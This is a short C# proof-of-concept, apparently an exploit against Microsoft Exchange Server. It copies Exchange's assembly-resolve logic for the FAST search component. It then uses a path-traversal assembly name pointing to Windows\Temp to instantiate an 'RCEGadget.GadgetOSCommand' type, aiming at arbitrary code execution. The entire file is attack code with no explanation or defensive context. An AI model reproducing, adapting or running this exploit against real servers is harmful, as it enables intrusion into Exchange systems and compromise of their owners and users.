using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace ArbitraryInstantiate
{
    class FastManagementClient
    {
        static FastManagementClient()
        {

            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(FastManagementClient.OnAssemblyResolveEvent);
        }

        private static readonly string fsisInstallPath = FastManagementClient.GetFastInstallPath();

        private static string GetFastInstallPath()
        {
            return new DirectoryInfo("C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin\\Search\\Ceres\\").FullName;
        }

        private static Assembly OnAssemblyResolveEvent(object sender, ResolveEventArgs args)
        {
            string str = args.Name.Split(new char[]
            {
        ','
            })[0];
            string text = Path.Combine(FastManagementClient.fsisInstallPath, "Installer\\Bin");
            string text2 = Path.Combine(FastManagementClient.fsisInstallPath, "HostController");
            string[] array = new string[]
            {
        text,
        text2
            };
            for (int i = 0; i < array.Length; i++)
            {
                string text3 = array[i] + Path.DirectorySeparatorChar.ToString() + str + ".dll";
                if (File.Exists(text3))
                {
                    return Assembly.LoadFrom(text3);
                }
            }
            return null;
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            FastManagementClient fsc = new FastManagementClient();
            object obj = AppDomain.CurrentDomain.CreateInstance("../../../../../../../../Windows/Temp/RCEGadget, version=1.2.3.4, culture=neutral, publicKeyToken=null", "RCEGadget.GadgetOSCommand");
        }
    }
}
